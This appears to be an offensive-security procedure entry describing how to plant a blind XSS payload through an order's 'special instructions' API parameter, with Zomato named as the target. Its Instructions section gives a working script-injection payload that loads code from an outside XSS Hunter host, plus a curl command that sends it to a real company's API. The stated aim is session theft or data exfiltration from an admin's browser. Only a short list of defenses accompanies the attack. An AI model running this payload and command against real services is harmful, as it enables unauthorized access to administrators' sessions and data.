---
tags:
  - xss
  - blind-xss
  - api-injection
type: procedure
tools:
  - '[[tools/XSS-Hunter]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/inject-xss-payload-via-api]]'
platforms:
  - Web
  - Mobile App
techniques:
  - '[[JavaScript]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 4bbfbb85-7ac9-4fac-a359-b24f85570020
created_at: '2025-12-13T23:56:20.296Z'
updated_at: '2025-12-13T23:56:20.296Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject Blind XSS Payload into API Parameter

## Summary

This procedure involves injecting a malicious JavaScript payload into a user-controlled parameter, such as special instructions in an API request, to exploit a blind XSS vulnerability that executes when viewed in a back-end dashboard.

## Description

In this attack scenario, the target is a web application like Zomato where user input from an API endpoint is not properly sanitized before being displayed in an admin interface. The procedure targets the special instructions parameter during order placement, injecting a script that loads an external resource for detection. This can lead to arbitrary code execution in the admin's browser, enabling session theft or data exfiltration. Prerequisites include a valid user account and access to the API.

## Requirements

1. Valid user account on the target application (e.g., Zomato)
2. Access to the API endpoint for submitting parameters
3. XSS Hunter account for payload detection

## Defense

Defensive measures and detection strategies:

- Implement proper input sanitization and output encoding for all user-provided data
- Use Content Security Policy (CSP) to restrict script sources
- Monitor for suspicious script loads in admin interfaces

## Objectives

1. Inject payload to persist in back-end data
2. Ensure payload executes blindly in admin context
3. Detect execution for confirmation

## Instructions

### Step 1: Prepare Payload

**Context**: Construct the XSS payload that references an external detection service.

The payload is: "><script src=https://{$handle}.xss.ht></script>

Replace {$handle} with your XSS Hunter handle.

> This payload breaks out of the HTML context and loads the external script.

### Step 2: Inject via API

**Context**: Send the payload through the API endpoint during order placement.

**Command** ([[commands/inject-xss-payload-via-api]]):
```bash
curl -X POST 'https://api.zomato.com/order' -d 'special_instructions="><script src=https://{$handle}.xss.ht></script>"'
```

> This command submits the order with the malicious instructions, assuming API authentication is handled (e.g., via headers).

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[JavaScript]]

### Sub-Techniques

## Commands Used

- [[commands/inject-xss-payload-via-api]]

## Tools Used

- [[tools/XSS-Hunter]]

## Tags

- [[xss]]
- [[blind-xss]]
